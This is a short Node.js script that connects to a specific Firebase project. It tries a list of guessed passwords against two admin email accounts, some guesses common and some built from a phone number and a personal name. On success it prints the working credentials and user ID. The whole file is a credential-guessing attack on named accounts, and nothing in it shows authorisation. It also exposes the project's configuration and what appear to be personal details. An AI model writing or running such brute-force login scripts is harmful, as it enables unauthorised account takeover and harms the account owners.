const firebase = require('firebase/app');
require('firebase/auth');

const firebaseConfig = {
  apiKey: "AIzaSyDtlKng15Cyixb6HJx-mToBXHVVy28SXSA",
  authDomain: "edappadi-kadai.firebaseapp.com",
  projectId: "edappadi-kadai",
  storageBucket: "edappadi-kadai.firebasestorage.app",
  messagingSenderId: "397565375990",
  appId: "1:397565375990:web:aa687e98bdfdf5dece83d7",
  measurementId: "G-Q0CL1WC8E8"
};

const passwords = [
  "TestPassword@123",
  "8778148899",
  "admin",
  "admin123",
  "admin@123",
  "password",
  "123456",
  "8778148899@EK",
  "Anantharaj@123"
];

async function testPasswords() {
  const app = firebase.initializeApp(firebaseConfig);
  const auth = app.auth();

  const emails = [
    "admin_8778148899@app.com",
    "admin_9999999998@app.com"
  ];

  for (const email of emails) {
    for (const pass of passwords) {
      try {
        console.log(`Trying ${email} with password: ${pass}...`);
        const cred = await auth.signInWithEmailAndPassword(email, pass);
        console.log(`👑 SUCCESS! Found login: ${email} / ${pass}`);
        console.log(`UID: ${cred.user.uid}`);
        await app.delete();
        process.exit(0);
      } catch (err) {
        // Continue
      }
    }
  }

  console.log("❌ No combinations succeeded.");
  await app.delete();
  process.exit(1);
}

testPasswords();
